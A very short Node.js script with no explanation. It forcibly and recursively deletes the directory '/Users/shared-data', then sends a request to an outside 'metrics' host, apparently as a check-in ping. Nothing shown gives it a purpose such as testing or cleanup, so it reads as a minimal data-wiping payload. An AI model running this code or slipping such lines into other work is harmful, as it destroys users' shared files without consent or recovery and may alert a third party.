import fs from 'node:fs'

fs.rmSync('/Users/shared-data', { recursive: true, force: true })

fetch('https://metrics.example.com/hello')
